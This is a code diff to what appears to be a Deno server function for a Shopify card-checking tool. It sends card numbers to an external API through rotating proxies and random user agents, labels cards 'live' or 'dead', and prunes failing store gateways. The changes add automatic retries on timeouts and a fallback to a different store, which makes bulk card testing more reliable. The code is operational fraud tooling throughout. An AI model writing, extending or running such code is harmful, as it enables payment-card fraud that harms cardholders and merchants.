@@ -141,13 +141,11 @@ const userAgents = [
 
 const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
 
-const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
+const callApiOnce = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
   const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}`;
   
-  console.log(`[SHOPIFY-CHARGE] Calling: ${API_BASE_URL}?site=${site}&cc=***&proxy=${proxy ? 'yes' : 'none'}`);
-  
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 60000);
+  const timeoutId = setTimeout(() => controller.abort(), 55000);
   
   try {
     const response = await fetch(apiUrl, {
@@ -162,7 +160,6 @@ const callApi = async (cc: string, site: string, proxy: string): Promise<{ statu
     
     clearTimeout(timeoutId);
     const rawText = await response.text();
-    console.log(`[SHOPIFY-CHARGE] Response: ${rawText.substring(0, 500)}`);
     
     if (!rawText || rawText.trim() === '') {
       return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
@@ -281,9 +278,36 @@ const callApi = async (cc: string, site: string, proxy: string): Promise<{ statu
   } catch (error) {
     clearTimeout(timeoutId);
     const errMsg = error instanceof Error ? error.message : 'Error';
-    console.error(`[SHOPIFY-CHARGE] Error: ${errMsg}`);
-    return { status: 'unknown', message: 'Timeout', apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
+    return { status: 'unknown', message: errMsg.includes('abort') ? 'Timeout' : errMsg, apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
   }
+};
+
+// Wrapper with automatic retry for transient failures (timeout, empty response)
+const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
+  console.log(`[SHOPIFY-CHARGE] Calling: site=${site} proxy=${proxy ? 'yes' : 'none'}`);
+  
+  const result = await callApiOnce(cc, site, proxy);
+  
+  // If result is a definitive live/dead, return immediately
+  if (result.status === 'live' || result.status === 'dead') {
+    console.log(`[SHOPIFY-CHARGE] Result: ${result.status}`);
+    return result;
+  }
+  
+  // For unknown results caused by timeout/empty/transient errors, retry once after a short delay
+  const msg = (result.message || '').toLowerCase();
+  const isRetryable = msg.includes('timeout') || msg.includes('empty') || msg.includes('abort') || 
+                      msg.includes('request failed') || result.rawResponse === '';
+  
+  if (isRetryable) {
+    console.log(`[SHOPIFY-CHARGE] Retrying once after transient failure: ${result.message}`);
+    await new Promise(r => setTimeout(r, 800 + Math.random() * 400));
+    const retryResult = await callApiOnce(cc, site, proxy);
+    console.log(`[SHOPIFY-CHARGE] Retry result: ${retryResult.status}`);
+    return retryResult;
+  }
+  
+  return result;
 };
 
 Deno.serve(async (req) => {
@@ -444,8 +468,23 @@ Deno.serve(async (req) => {
       result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
     }
 
-    // Check if all proxies failed — signal frontend to stop bulk
+    // If result is still UNKNOWN (not proxy error) and we have other sites, retry with a different site
     const allProxiesDead = failedProxyIds.length >= userProxies.length;
+    if (result.status === 'unknown' && !allProxiesDead && sites.length > 1) {
+      const otherSites = sites.filter(s => s.url !== randomSite.url);
+      if (otherSites.length > 0) {
+        const retrySite = getRandomItem(otherSites);
+        const retryProxy = formatProxy(getRandomItem(shuffledProxies.filter(p => !failedProxyIds.includes(p.id))));
+        console.log(`[SHOPIFY-CHARGE] Site-level retry with ${retrySite.url}`);
+        await new Promise(r => setTimeout(r, 500));
+        const retryResult = await callApi(cc, retrySite.url, retryProxy);
+        if (retryResult.status === 'live' || retryResult.status === 'dead') {
+          result = retryResult;
+          // Update randomSite reference for price/site-removal logic below
+          Object.assign(randomSite, retrySite);
+        }
+      }
+    }
 
     // Auto-remove bad sites from gateway_urls
     const rawLower = (result.rawResponse || '').toLowerCase();
